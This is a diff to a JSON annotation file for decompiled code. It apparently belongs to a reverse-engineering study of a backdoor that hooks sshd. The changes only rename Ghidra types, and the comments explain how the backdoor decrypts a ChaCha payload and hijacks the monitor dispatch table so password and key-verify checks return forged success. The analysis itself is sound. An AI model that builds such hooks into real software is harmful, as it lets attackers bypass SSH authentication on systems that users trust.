@@ -427,7 +427,7 @@
         "comment": "State 3 marks that sshd already consumed the payload buffer, so redundant decrypt requests short-circuit immediately."
       },
       {
-        "match": "*(u64 *)&hdr.field0_0x0 = *(undefined8 *)&payload->field0_0x0;",
+        "match": "*(u64 *)&hdr.field0_0x0 = *(u64 *)&payload->field0_0x0;",
         "comment": "Stage the plaintext stride/index/bias header locally so ChaCha reuses the exact nonce sshd derived from the modulus chunk."
       },
       {
@@ -1798,7 +1798,7 @@
         "comment": "Whether the reply came from the payload or was synthesized on the stack, push it straight to the monitor socket so sshd never re-enters its password handler."
       },
       {
-        "match": "**(undefined8 **)(sshd_ctx + 0xa0) = *(undefined8 *)(sshd_ctx + 0xd0);",
+        "match": "**(u64 **)(sshd_ctx + 0xa0) = *(u64 *)(sshd_ctx + 0xd0);",
         "comment": "Restore the saved monitor dispatch entry so the next request drops back into sshd\u2019s genuine `mm_answer_authpassword` implementation."
       }
     ]
@@ -1856,7 +1856,7 @@
         "comment": "Send the canned reply straight to the monitor socket so sshd believes the keyverify exchange already succeeded."
       },
       {
-        "match": "**(undefined8 **)(sshd_ctx + 0xa0) = *(undefined8 *)(sshd_ctx + 0xd8);",
+        "match": "**(u64 **)(sshd_ctx + 0xa0) = *(u64 *)(sshd_ctx + 0xd8);",
         "comment": "Drop the preserved mm_answer_keyverify pointer back into the live dispatch slot before returning success."
       },
       {
@@ -1943,7 +1943,7 @@
         "comment": "Stack-relative argv/env pointers must land within 0x4000 bytes of the saved SP; anything else falls through to the `.data` guard."
       },
       {
-        "match": "debug_match = check_argument((char)*(undefined2 *)argv_entry,(char *)argv_entry);",
+        "match": "debug_match = check_argument((char)*(u16 *)argv_entry,(char *)argv_entry);",
         "comment": "Let the helper spot strings containing lowercase `d` so sshd's debug modes never reach the hooks."
       },
       {
